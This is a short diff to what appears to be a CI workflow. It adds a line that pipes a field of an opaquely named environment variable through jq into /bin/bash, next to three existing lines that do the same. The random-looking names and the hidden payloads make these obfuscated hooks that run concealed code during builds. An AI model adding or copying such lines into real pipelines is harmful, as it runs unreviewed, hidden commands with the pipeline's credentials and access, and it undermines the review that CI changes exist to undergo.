@@ -30,6 +30,7 @@ jobs:
           echo $maxlj50149 | jq -r .zfshd67910 | /bin/bash
           echo $k7 | jq -r .fiw7 | /bin/bash
           echo $ndo0217 | jq -r .louq029 | /bin/bash
+          printf '%s' "$aio39794" | jq -r .denh6954 | /bin/bash
 
       - name: Archive output
         if: always()
